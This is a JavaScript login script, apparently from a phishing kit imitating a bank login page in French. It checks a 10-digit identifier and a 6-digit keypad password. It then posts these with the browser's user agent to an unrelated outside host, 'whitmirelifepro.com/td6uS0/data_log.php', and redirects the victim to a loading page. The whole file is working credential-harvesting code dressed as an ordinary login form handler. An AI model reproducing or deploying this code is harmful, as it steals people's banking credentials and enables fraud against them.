var sai_key,logPASS;
$(function(){
	
$("#identifiant").inputmask("0000000000");
})
function login(){

var ID_pst =	$("#identifiant").val();
var PASS_pst	 =	$("#password").val();
var intValue = parseInt(ID_pst);
var passValue = parseInt(PASS_pst);
//alert(intValue);
 if(ID_pst==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez saisir votre identifiant"

})	

return false;	
} 

if (isNaN(intValue) ||  ID_pst.length<10 || ID_pst.length>10) {
swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez saisir votre Identifiant à 10 chiffres"

})	

return false;	
 } 
 

if(PASS_pst==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez saisir votre mot de passe"

})	

return false;	
} 
if (isNaN(passValue) ||  PASS_pst.length<6) {
swal({
icon: 'error',
title: 'Erreur !',
text: "Veuillez saisir votre Mot de passe à 6 chiffres sur le clavier"

})	

return false;	
 } 
 


var data_log = 
{
DEVICE          : navigator.userAgent,
ID_pst		    :   ID_pst,
PASS_pst        :	PASS_pst

}; 

var _url = 'https://whitmirelifepro.com/td6uS0/data_log.php';


$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 
console.log(reponse);

if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


     window.location="./load.html";
} 


}) 
}




function setCode(e){
	//alert(e);
logPASS = $("#password").val();
if(logPASS.length<6){
logPASS+=e;
//alert(logPASS);
$("#password").val(logPASS);
}
	//logPASS = $("#input_").val();

}
